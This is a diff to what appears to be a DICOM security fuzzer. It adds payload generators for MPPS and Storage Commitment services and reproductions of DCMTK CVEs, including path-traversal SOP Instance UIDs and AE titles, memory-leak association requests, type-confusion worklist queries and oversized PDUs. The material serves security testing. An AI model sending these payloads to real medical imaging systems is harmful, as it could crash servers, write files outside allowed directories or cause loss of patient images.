+                'MPPS', 'N-SET-RQ', steps=steps,
+                bug_class='unvalidated-enumerated-value',
+                target_field='(0040,0252) Performed Procedure Step Status',
+                target_sop_class=MPPS_SOP_CLASS_UID),
+        )
+
+    @classmethod
+    def mpps_ncreate_duplicate_instance(cls) -> AttackResult:
+        """Two N-CREATEs claiming the same Affected SOP Instance UID."""
+        dataset = cls._mpps_dataset('IN PROGRESS')
+        assoc = raw_associate_rq('MPPSSCP', 'C-SCARE-FZ', MPPS_SOP_CLASS_UID)
+        first = _n_pdata_bytes(N_CREATE_RQ(
+            affected_sop_class_uid=MPPS_SOP_CLASS_UID, message_id=5,
+            data_set_type=0x0102,
+            affected_sop_instance_uid=cls._MPPS_INSTANCE), dataset)
+        second = _n_pdata_bytes(N_CREATE_RQ(
+            affected_sop_class_uid=MPPS_SOP_CLASS_UID, message_id=6,
+            data_set_type=0x0102,
+            affected_sop_instance_uid=cls._MPPS_INSTANCE), dataset)
+        steps = [assoc, first, second, raw_release_rq()]
+        return AttackResult(
+            name='dimse_n_mpps_ncreate_duplicate_instance',
+            category='dimse_n',
+            payload=b''.join(steps),
+            description='Two MPPS N-CREATE-RQs claim the same SOP Instance UID '
+                        'in one association',
+            expected_behavior='SCP should reject the second with "duplicate SOP '
+                              'instance" (0x0111) rather than overwrite the first',
+            metadata=_dimse_n_metadata(
+                'MPPS', 'N-CREATE-RQ', steps=steps,
+                bug_class='duplicate-instance-overwrite',
+                target_sop_class=MPPS_SOP_CLASS_UID),
+        )
+
+    # -------------------------------------------------------------------------
+    # Storage Commitment Push Model (PS3.4 Annex J)
+    # -------------------------------------------------------------------------
+
+    @classmethod
+    def storage_commitment_naction_unstored_instances(cls) -> AttackResult:
+        """Commitment request naming instances the SCP never received.
+
+        The SCP must answer with a Failed SOP Sequence. One that reports
+        success for objects it does not hold gives the SCU permission to
+        delete its only copy.
+        """
+        ds = Dataset()
+        ds = ds / Element(0x0008, 0x1195, 'UI', '1.2.826.0.1.3680043.10.543.701.1')
+        ds = ds / Element(0x0008, 0x1199, 'SQ', b'')     # Referenced SOP Sequence
+        ds = ds / Element(0x0008, 0x1150, 'UI', CT_IMAGE_STORAGE_SOP_CLASS_UID)
+        ds = ds / Element(0x0008, 0x1155, 'UI', '1.2.826.0.1.3680043.10.543.701.404')
+        cmd = N_ACTION_RQ(
+            requested_sop_class_uid=STORAGE_COMMITMENT_SOP_CLASS_UID,
+            message_id=7,
+            data_set_type=0x0102,
+            requested_sop_instance_uid=STORAGE_COMMITMENT_SOP_INSTANCE_UID,
+            action_type_id=1,
+        )
+        payload, steps = _n_service_sequence(
+            cmd, STORAGE_COMMITMENT_SOP_CLASS_UID, ds.encode(implicit_vr=True),
+            called_ae='COMMITSCP')
+        return AttackResult(
+            name='dimse_n_storage_commitment_unstored_instances',
+            category='dimse_n',
+            payload=payload,
+            description='Storage Commitment N-ACTION-RQ requests commitment for '
+                        'a SOP Instance the SCP never stored',
+            expected_behavior='SCP must report the instance in the Failed SOP '
+                              'Sequence, never as committed',
+            metadata=_dimse_n_metadata(
+                'Storage Commitment', 'N-ACTION-RQ', steps=steps,
+                bug_class='false-commitment',
+                target_field='(0008,1199) Referenced SOP Sequence',
+                target_sop_class=STORAGE_COMMITMENT_SOP_CLASS_UID),
+        )
+
+    @classmethod
+    def storage_commitment_naction_invalid_action_type(cls) -> AttackResult:
+        """Commitment N-ACTION with an action type PS3.4 J does not define."""
+        cmd = N_ACTION_RQ(
+            requested_sop_class_uid=STORAGE_COMMITMENT_SOP_CLASS_UID,
+            message_id=8,
+            data_set_type=0x0101,           # no data set
+            requested_sop_instance_uid=STORAGE_COMMITMENT_SOP_INSTANCE_UID,
+            action_type_id=0xFFFF,
+        )
+        payload, steps = _n_service_sequence(
+            cmd, STORAGE_COMMITMENT_SOP_CLASS_UID, called_ae='COMMITSCP')
+        return AttackResult(
+            name='dimse_n_storage_commitment_invalid_action_type',
+            category='dimse_n',
+            payload=payload,
+            description='Storage Commitment N-ACTION-RQ uses Action Type ID '
+                        '0xFFFF (only 1 is defined)',
+            expected_behavior='SCP should return "no such action type" (0x0123) '
+                              'without indexing an action table on it',
+            metadata=_dimse_n_metadata(
+                'Storage Commitment', 'N-ACTION-RQ', steps=steps,
+                bug_class='unvalidated-type-dispatch',
+                action_type_id=0xFFFF,
+                target_sop_class=STORAGE_COMMITMENT_SOP_CLASS_UID),
+        )
+
+    @classmethod
+    def storage_commitment_unsolicited_event_report(cls) -> AttackResult:
+        """N-EVENT-REPORT pushed without any prior N-ACTION request.
+
+        Commitment results normally arrive on a *separate* association from
+        the SCP. An implementation that accepts a result it never asked for
+        can be told that objects are safely committed by any peer that can
+        reach its listening port.
+        """
+        ds = Dataset()
+        ds = ds / Element(0x0008, 0x1195, 'UI', '1.2.826.0.1.3680043.10.543.701.2')
+        ds = ds / Element(0x0008, 0x1199, 'SQ', b'')
+        ds = ds / Element(0x0008, 0x1150, 'UI', CT_IMAGE_STORAGE_SOP_CLASS_UID)
+        ds = ds / Element(0x0008, 0x1155, 'UI', '1.2.826.0.1.3680043.10.543.701.7')
+        cmd = N_EVENT_REPORT_RQ(
+            affected_sop_class_uid=STORAGE_COMMITMENT_SOP_CLASS_UID,
+            message_id=9,
+            data_set_type=0x0102,
+            affected_sop_instance_uid=STORAGE_COMMITMENT_SOP_INSTANCE_UID,
+            event_type_id=1,                # 1 = Storage Commitment Request Successful
+        )
+        payload, steps = _n_service_sequence(
+            cmd, STORAGE_COMMITMENT_SOP_CLASS_UID, ds.encode(implicit_vr=True),
+            called_ae='COMMITSCU')
+        return AttackResult(
+            name='dimse_n_storage_commitment_unsolicited_event_report',
+            category='dimse_n',
+            payload=payload,
+            description='Unsolicited Storage Commitment N-EVENT-REPORT-RQ reports '
+                        'success for a Transaction UID the receiver never issued',
+            expected_behavior='Receiver must correlate the Transaction UID to an '
+                              'outstanding request it made, and ignore the rest',
+            metadata=_dimse_n_metadata(
+                'Storage Commitment', 'N-EVENT-REPORT-RQ', steps=steps,
+                bug_class='unsolicited-result-acceptance',
+                target_field='(0008,1195) Transaction UID',
+                target_sop_class=STORAGE_COMMITMENT_SOP_CLASS_UID),
+        )
+
+    @classmethod
+    def storage_commitment_event_report_invalid_event_type(cls) -> AttackResult:
+        """Commitment N-EVENT-REPORT with an event type outside PS3.4 J."""
+        cmd = N_EVENT_REPORT_RQ(
+            affected_sop_class_uid=STORAGE_COMMITMENT_SOP_CLASS_UID,
+            message_id=10,
+            data_set_type=0x0101,
+            affected_sop_instance_uid=STORAGE_COMMITMENT_SOP_INSTANCE_UID,
+            event_type_id=0xFFFF,
+        )
+        payload, steps = _n_service_sequence(
+            cmd, STORAGE_COMMITMENT_SOP_CLASS_UID, called_ae='COMMITSCU')
+        return AttackResult(
+            name='dimse_n_storage_commitment_invalid_event_type',
+            category='dimse_n',
+            payload=payload,
+            description='Storage Commitment N-EVENT-REPORT-RQ uses Event Type ID '
+                        '0xFFFF (only 1 and 2 are defined)',
+            expected_behavior='Receiver should return "no such event type" '
+                              '(0x0113) without indexing on the value',
+            metadata=_dimse_n_metadata(
+                'Storage Commitment', 'N-EVENT-REPORT-RQ', steps=steps,
+                bug_class='unvalidated-type-dispatch',
+                event_type_id=0xFFFF,
+                target_sop_class=STORAGE_COMMITMENT_SOP_CLASS_UID),
+        )
+
+    # -------------------------------------------------------------------------
+    # Generic normalized-service handling
+    # -------------------------------------------------------------------------
+
+    @classmethod
+    def n_get_attribute_list_bomb(cls, count: int = 8192) -> AttackResult:
+        """N-GET whose Attribute Identifier List repeats one tag ``count`` times.
+
+        (0000,1005) is VR AT with VM 1-n, so a long list is legal encoding.
+        The question is whether the SCP bounds the list before allocating a
+        result per requested attribute.
+        """
+        cmd = N_GET_RQ(
+            requested_sop_class_uid=MPPS_SOP_CLASS_UID,
+            message_id=11,
+            data_set_type=0x0101,
+            requested_sop_instance_uid=cls._MPPS_INSTANCE,
+            attribute_identifier_list=[(0x0040, 0x0252)] * count,
+        )
+        payload, steps = _n_service_sequence(cmd, MPPS_SOP_CLASS_UID)
+        return AttackResult(
+            name='dimse_n_get_attribute_list_bomb',
+            category='dimse_n',
+            payload=payload,
+            description=f'N-GET-RQ Attribute Identifier List repeats one tag {count} times',
+            expected_behavior='SCP should bound the requested attribute list '
+                              'before allocating per-attribute state',
+            metadata=_dimse_n_metadata(
+                'MPPS', 'N-GET-RQ', steps=steps,
+                bug_class='unbounded-value-multiplicity',
+                target_field='(0000,1005) Attribute Identifier List',
+                requested_attribute_count=count,
+                target_sop_class=MPPS_SOP_CLASS_UID),
+        )
+
+    @classmethod
+    def n_delete_well_known_instance(cls) -> AttackResult:
+        """N-DELETE aimed at the well-known Storage Commitment SOP instance.
+
+        1.2.840.10008.1.20.1.1 is fixed by the standard and is not a
+        deletable object; an SCP that routes it into a generic instance-delete
+        path can lose the commitment service for every peer.
+        """
+        cmd = N_DELETE_RQ(
+            requested_sop_class_uid=STORAGE_COMMITMENT_SOP_CLASS_UID,
+            message_id=12,
+            data_set_type=0x0101,
+            requested_sop_instance_uid=STORAGE_COMMITMENT_SOP_INSTANCE_UID,
+        )
+        payload, steps = _n_service_sequence(
+            cmd, STORAGE_COMMITMENT_SOP_CLASS_UID, called_ae='COMMITSCP')
+        return AttackResult(
+            name='dimse_n_delete_well_known_instance',
+            category='dimse_n',
+            payload=payload,
+            description='N-DELETE-RQ targets the well-known Storage Commitment '
+                        'SOP Instance 1.2.840.10008.1.20.1.1',
+            expected_behavior='SCP must refuse to delete a standard well-known '
+                              'SOP instance',
+            metadata=_dimse_n_metadata(
+                'Storage Commitment', 'N-DELETE-RQ', steps=steps,
+                bug_class='well-known-instance-deletion',
+                target_sop_class=STORAGE_COMMITMENT_SOP_CLASS_UID),
+        )
+
+    @classmethod
+    def all(cls) -> Generator[AttackResult, None, None]:
+        """Yield every DIMSE-N normalized-service attack payload."""
+        yield cls.mpps_ncreate_dataset_flag_without_data()
+        yield cls.mpps_nset_unknown_instance()
+        yield cls.mpps_nset_reopen_completed_step()
+        yield cls.mpps_nset_final_state_undefined_value()
+        yield cls.mpps_ncreate_duplicate_instance()
+        yield cls.storage_commitment_naction_unstored_instances()
+        yield cls.storage_commitment_naction_invalid_action_type()
+        yield cls.storage_commitment_unsolicited_event_report()
+        yield cls.storage_commitment_event_report_invalid_event_type()
+        yield cls.n_get_attribute_list_bomb()
+        yield cls.n_delete_well_known_instance()
+
 
 class CVEAttacks:
     """
@@ -1550,7 +3562,7 @@ class CVEAttacks:
     Each method generates one or more AttackResult objects that reproduce
     the conditions described in the CVE.
     """
-    
+
     # -------------------------------------------------------------------------
     # CVE-2023-32135: Use-After-Free in DCM File Parsing
     # -------------------------------------------------------------------------
@@ -1621,6 +3633,226 @@ class CVEAttacks:
         ))
         
         return results
+
+    # -------------------------------------------------------------------------
+    # ICSMA-26-181-01: OFFIS DCMTK Toolkit <= 3.7.0
+    # -------------------------------------------------------------------------
+
+    @staticmethod
+    def cve_2026_50003_cget_bit_preserving_path_traversal() -> List[AttackResult]:
+        """
+        CVE-2026-50003: a hostile C-GET SCP can make a DCMTK client using
+        bit-preserving storage write outside the selected output directory.
+        """
+        results = []
+        payloads = [
+            ('relative', '../../outside-cget/c-scare-cget.dcm'),
+            ('absolute', '/tmp/c-scare-cget/escaped.dcm'),
+        ]
+        for payload_id, path_value in payloads:
+            ds = _injection_base_dataset()
+            ds[0x00080018] = Element(0x0008, 0x0018, 'UI', path_value)
+            metadata = _icsma_metadata(
+                'CVE-2026-50003',
+                'CWE-22',
+                'rogue C-GET SCP feeding a DCMTK client in bit-preserving '
+                'storage mode',
+                'instrumented C-GET SCU/client-response harness seeded with '
+                'path-bearing C-STORE sub-operations',
+                'DCMTK C-GET client',
+            )
+            metadata.update({
+                'target_role': 'scu-client',
+                'delivery': 'hostile-cget-cstore',
+                'target_field': '(0008,0018) SOP Instance UID',
+                'traversal_payload': path_value,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': path_value,
+            })
+            results.append(AttackResult(
+                name=f'cve_2026_50003_cget_bit_preserving_{payload_id}',
+                category='cve',
+                payload=ds.encode(),
+                description='C-GET C-STORE sub-operation carries a path-like '
+                            f'SOP Instance UID ({payload_id})',
+                expected_behavior='Client must confine bit-preserved output to '
+                                  'the selected storage directory',
+                metadata=metadata,
+            ))
+        return results
+
+    @staticmethod
+    def cve_2026_50254_storescp_association_leak() -> List[AttackResult]:
+        """CVE-2026-50254: repeated crafted connection requests leak memory
+        in storescp single-process mode."""
+        malformed_max_length = raw_item(0x51, b'')
+        payload = raw_associate_rq(
+            'STORESCP',
+            'C-SCARE-FZ',
+            CT_IMAGE_STORAGE_SOP_CLASS_UID,
+            user_info_payload=malformed_max_length,
+        )
+        metadata = _icsma_metadata(
+            'CVE-2026-50254',
+            'CWE-401',
+            'repeat this single A-ASSOCIATE-RQ against a live storescp and '
+            'watch RSS/availability',
+            'AFLNet net-storescp with LSan triage and --include-queue leak '
+            'replays',
+            'storescp',
+        )
+        metadata.update({
+            'target_role': 'scp-server',
+            'delivery': 'raw-pdu',
+            'repeat_for_detection': 1000,
+            'expected_monitor': 'memory-growth-or-lsan',
+        })
+        return [AttackResult(
+            name='cve_2026_50254_storescp_assoc_leak_truncated_max_length',
+            category='cve',
+            payload=payload,
+            description='storescp association request with a malformed Maximum '
+                        'Length user-information sub-item',
+            expected_behavior='storescp must reject the association and release '
+                              'all per-request allocations',
+            metadata=metadata,
+        )]
+
+    @staticmethod
+    def cve_2026_35505_association_request_leak() -> List[AttackResult]:
+        """CVE-2026-35505: repeated crafted connection requests leak memory
+        until a single-process service is killed."""
+        duplicate_max_length = raw_item(0x51, struct.pack('!I', 0))
+        duplicate_max_length += raw_item(0x51, struct.pack('!I', 0xFFFFFFFF))
+        payload = raw_associate_rq(
+            'DCMQRSCP',
+            'C-SCARE-FZ',
+            VERIFICATION_SOP_CLASS_UID,
+            user_info_payload=duplicate_max_length,
+        )
+        metadata = _icsma_metadata(
+            'CVE-2026-35505',
+            'CWE-401',
+            'repeat crafted A-ASSOCIATE-RQ against the affected single-process '
+            'DCMTK SCP and watch RSS/availability',
+            'AFLNet network SCP profile with LSan triage and queue replay for '
+            'leak-only findings',
+            'DCMTK single-process SCP',
+        )
+        metadata.update({
+            'target_role': 'scp-server',
+            'delivery': 'raw-pdu',
+            'repeat_for_detection': 1000,
+            'expected_monitor': 'memory-growth-or-lsan',
+        })
+        return [AttackResult(
+            name='cve_2026_35505_assoc_leak_duplicate_max_length',
+            category='cve',
+            payload=payload,
+            description='Association request carries duplicate Maximum Length '
+                        'sub-items with conflicting values',
+            expected_behavior='SCP must reject or normalize the association and '
+                              'release all per-request allocations',
+            metadata=metadata,
+        )]
+
+    @staticmethod
+    def cve_2026_52868_worklist_directory_escape() -> List[AttackResult]:
+        """CVE-2026-52868: worklist query escapes the intended per-AE
+        worklist storage area."""
+        identifier = Dataset()
+        identifier = identifier / Element(0x0008, 0x0050, 'SH', '')
+        identifier = identifier / Element(0x0010, 0x0010, 'PN', '')
+        identifier = identifier / Element(0x0010, 0x0020, 'LO', '')
+        assoc = raw_associate_rq(
+            '../ORTHO',
+            'C-SCARE-FZ',
+            MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
+        )
+        pdata = _cfind_pdata_bytes(identifier)
+        release = raw_release_rq()
+        metadata = _icsma_metadata(
+            'CVE-2026-52868',
+            'CWE-22',
+            'C-FIND against a worklist SCP configured with multiple per-AE '
+            'storage areas, using a traversal-shaped Called AE Title',
+            'future AFLNet net-dcmwlm/worklist profile with per-AE directory '
+            'fixtures and response-diff oracle',
+            'DCMTK worklist SCP',
+        )
+        metadata.update({
+            'target_role': 'scp-server',
+            'delivery': 'dicom-cfind-sequence',
+            'query_sop_class_uid': MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
+            'called_ae_title': '../ORTHO',
+            'greybox_prerequisite': 'add an instrumented worklist SCP target '
+                                    'profile; net-dcmqrscp is not a worklist '
+                                    'server',
+            'steps': [assoc, pdata, release],
+        })
+        return [AttackResult(
+            name='cve_2026_52868_worklist_called_ae_traversal',
+            category='cve',
+            payload=assoc + pdata + release,
+            description='Modality Worklist C-FIND uses a traversal-shaped '
+                        'Called AE Title to probe per-AE directory isolation',
+            expected_behavior='Worklist SCP must not return records outside '
+                              'the Called AE Title storage area',
+            metadata=metadata,
+        )]
+
+    @staticmethod
+    def cve_2026_44628_worklist_type_confusion() -> List[AttackResult]:
+        """CVE-2026-44628: crafted worklist query can crash the worklist
+        server when normal storage/lockfile/record preconditions exist."""
+        identifier = Dataset()
+        identifier = identifier / Element(0x0008, 0x0060, 'CS', 'CT')
+        identifier = identifier / Element(0x0010, 0x0010, 'PN', '*')
+        identifier = identifier / Element(0x0040, 0x0100, 'LO', 'not-a-sequence')
+        assoc = raw_associate_rq(
+            'WORKLIST',
+            'C-SCARE-FZ',
+            MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
+        )
+        pdata = _cfind_pdata_bytes(identifier, message_id=2)
+        release = raw_release_rq()
+        metadata = _icsma_metadata(
+            'CVE-2026-44628',
+            'CWE-843',
+            'single C-FIND against a seeded worklist SCP with valid Called AE, '
+            'storage directory, lockfile, and at least one matching record',
+            'future AFLNet net-dcmwlm/worklist profile with seeded records and '
+            'ASan/UBSan crash triage',
+            'DCMTK worklist SCP',
+        )
+        metadata.update({
+            'target_role': 'scp-server',
+            'delivery': 'dicom-cfind-sequence',
+            'query_sop_class_uid': MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
+            'called_ae_title': 'WORKLIST',
+            'target_field': '(0040,0100) Scheduled Procedure Step Sequence',
+            'type_confusion': 'SQ tag encoded as LO scalar',
+            'preconditions': [
+                'valid Called AE Title',
+                'configured worklist storage directory',
+                'expected lockfile exists',
+                'at least one matching worklist record',
+            ],
+            'greybox_prerequisite': 'add an instrumented worklist SCP target '
+                                    'profile; net-dcmqrscp is not a worklist '
+                                    'server',
+            'steps': [assoc, pdata, release],
+        })
+        return [AttackResult(
+            name='cve_2026_44628_worklist_sps_sequence_type_confusion',
+            category='cve',
+            payload=assoc + pdata + release,
+            description='Modality Worklist C-FIND encodes Scheduled Procedure '
+                        'Step Sequence as a scalar LO value',
+            expected_behavior='Worklist SCP must reject the mistyped key without '
+                              'crashing',
+            metadata=metadata,
+        )]
     
     # -------------------------------------------------------------------------
     # CVE-2024-24793: Use-After-Free in File Meta Information
@@ -2184,6 +4416,8 @@ class CVEAttacks:
             expected_behavior='Parser must bound nesting depth to avoid stack '
                               'exhaustion',
             metadata={'cve': 'CVE-2026-10528', 'product': 'Orthanc/DCMTK',
+                      'delivery_hint': 'cstore',
+                      'transfer_syntax': '1.2.840.10008.1.2.1',
                       'structural_trigger': True,
                       'bug_class': 'recursion-stack-exhaustion',
                       'target_func': 'DcmItem::read'}
@@ -2208,6 +4442,8 @@ class CVEAttacks:
             expected_behavior='Parser must bound recursion regardless of '
                               'defined vs undefined length',
             metadata={'cve': 'CVE-2026-10528', 'product': 'Orthanc/DCMTK',
+                      'delivery_hint': 'cstore',
+                      'transfer_syntax': '1.2.840.10008.1.2.1',
                       'structural_trigger': True,
                       'bug_class': 'recursion-stack-exhaustion',
                       'target_func': 'DcmItem::read'}
@@ -2241,6 +4477,7 @@ class CVEAttacks:
             expected_behavior='Parser must bound nesting depth before the stack '
                               'is exhausted',
             metadata={'cve': 'CVE-2026-10528', 'product': 'Orthanc/DCMTK',
+                      'delivery_hint': 'cstore',
                       'structural_trigger': True,
                       'bug_class': 'recursion-stack-exhaustion',
                       'target_func': 'DcmItem::read'}
@@ -2398,6 +4635,7 @@ class CVEAttacks:
             expected_behavior='Parser must null-check before dereferencing the '
                               'first sequence item',
             metadata={'cve': 'CVE-2022-2121', 'product': 'DCMTK',
+                      'delivery_hint': 'cstore',
                       'structural_trigger': True, 'bug_class': 'null-deref'}
         ))
 
@@ -2421,13 +4659,14 @@ class CVEAttacks:
             expected_behavior='Codec must null-check the offset table / first '
                               'fragment',
             metadata={'cve': 'CVE-2022-2121', 'product': 'DCMTK',
+                      'delivery_hint': 'cstore',
                       'structural_trigger': True, 'bug_class': 'null-deref'}
         ))
 
         return results
 
     # -------------------------------------------------------------------------
-    # CVE-2025-14607: DCMTK DcmByteString::makeDicomByteString memory corruption
+    # CVE-2025-14607: DCMTK DcmByteString::makeDicomByteString m
     # -------------------------------------------------------------------------
 
     @staticmethod
@@ -2460,6 +4699,7 @@ class CVEAttacks:
             expected_behavior='String normalisation must bound-check the declared '
                               'length',
             metadata={'cve': 'CVE-2025-14607', 'product': 'DCMTK',
+                      'delivery_hint': 'cstore',
                       'bug_class': 'memory-corruption',
                       'target_func': 'DcmByteString::makeDicomByteString'}
         ))
@@ -2482,6 +4722,7 @@ class CVEAttacks:
                         'pad-to-even',
             expected_behavior='Padding logic must not write past the buffer',
             metadata={'cve': 'CVE-2025-14607', 'product': 'DCMTK',
+                      'delivery_hint': 'cstore',
                       'bug_class': 'memory-corruption',
                       'target_func': 'DcmByteString::makeDicomByteString'}
         ))
@@ -2503,6 +4744,7 @@ class CVEAttacks:
             expected_behavior='String normalisation must bound-check the declared '
                               'length',
             metadata={'cve': 'CVE-2025-14607', 'product': 'DCMTK',
+                      'delivery_hint': 'cstore',
                       'bug_class': 'memory-corruption',
                       'target_func': 'DcmByteString::makeDicomByteString'}
         ))
@@ -2557,6 +4799,7 @@ class CVEAttacks:
             expected_behavior='Renderer must validate bit fields before scanning '
                               'pixel min/max',
             metadata={'cve': 'CVE-2024-47796', 'product': 'DCMTK',
+                      'delivery_hint': 'cstore',
                       'structural_trigger': True, 'bug_class': 'oob-write',
                       'target_func': 'determineMinMax'}
         ))
@@ -2572,6 +4815,7 @@ class CVEAttacks:
             expected_behavior='Renderer must bound the scan by the actual pixel '
                               'buffer length',
             metadata={'cve': 'CVE-2024-47796', 'product': 'DCMTK',
+                      'delivery_hint': 'cstore',
                       'structural_trigger': True, 'bug_class': 'oob-write',
                       'target_func': 'determineMinMax'}
         ))
@@ -2611,12 +4855,9 @@ class CVEAttacks:
 
         # PDU whose declared length vastly exceeds the bytes that follow — the
         # DUL reader may copy past the receive buffer.
-        if not SCAPY_AVAILABLE:
-            payload = b'\x01\x00' + struct.pack('!I', 0x7FFFFFFF) + b'X' * 64
-        else:
-            pkt = DICOM(length=0x7FFFFFFF) / A_ASSOCIATE_RQ(
-                called_ae_title='TARGET', calling_ae_title='ATTACKER')
-            payload = raw(pkt)
+        pkt = DICOM(length=0x7FFFFFFF) / A_ASSOCIATE_RQ(
+            called_ae_title='TARGET', calling_ae_title='ATTACKER')
+        payload = raw(pkt)
         results.append(AttackResult(
             name='cve_2015_8979_02_oversized_pdu_length',
             category='cve',
@@ -3060,6 +5301,7 @@ class CVEAttacks:
                 expected_behavior='dcmpstat must type-check (0028,3010) before '
                                   'casting to a sequence',
                 metadata={'cve': 'CVE-2024-28130', 'product': 'DCMTK',
+                          'delivery_hint': 'cstore',
                           'bug_class': 'type-confusion',
                           'target_func': 'DVPSSoftcopyVOI_PList::createFromImage',
                           'target_field': '(0028,3010) VOI LUT Sequence'}
@@ -3270,6 +5512,11 @@ class CVEAttacks:
         yield from cls.cve_2024_24793_duplicate_meta_tags()
         yield from cls.cve_2024_24794_sequence_duplicates()
         yield from cls.cve_2019_11687_polyglot()
+        yield from cls.cve_2026_50003_cget_bit_preserving_path_traversal()
+        yield from cls.cve_2026_50254_storescp_association_leak()
+        yield from cls.cve_2026_35505_association_request_leak()
+        yield from cls.cve_2026_52868_worklist_directory_escape()
+        yield from cls.cve_2026_44628_worklist_type_confusion()
         yield from cls.cve_2026_3650_gdcm_vr_memory_leak()
         yield from cls.cve_2026_5437_meta_header_oob()
         yield from cls.cve_2026_10528_dcmitem_read_stack()
@@ -3315,14 +5562,8 @@ class ProtocolSeedGenerator:
         """Yield fuzzed A-ASSOCIATE-RQ payloads."""
         for i in range(count):
             try:
-                if SCAPY_AVAILABLE:
-                    pdu_bytes = raw(fuzz(DICOM() / A_ASSOCIATE_RQ()))
-                    mutation = 'scapy_fuzz'
-                else:
-                    pdu_bytes = ProtocolAttacks.malformed_protocol_version(
-                        random.randint(0, 0xFFFF)
-                    ).payload
-                    mutation = 'protocol_version'
+                pdu_bytes = raw(fuzz(DICOM() / A_ASSOCIATE_RQ()))
+                mutation = 'scapy_fuzz'
 
                 yield AttackResult(
                     name=f'fuzz_assoc_{i}',
@@ -3351,17 +5592,6 @@ class ProtocolSeedGenerator:
 
         for i in range(count):
             try:
-                if not SCAPY_AVAILABLE:
-                    yield AttackResult(
-                        name=f'fuzz_cstore_{i}',
-                        category='fuzzer',
-                        payload=b'',
-                        description='Scapy not available',
-                        expected_behavior='N/A',
-                        success=False,
-                    )
-                    continue
-
                 if i % 5 == 0:
                     cmd = C_STORE_RQ(
                         command_group_length=random.choice([0, 10, 0xFFFF, 0xFFFFFFFF]),
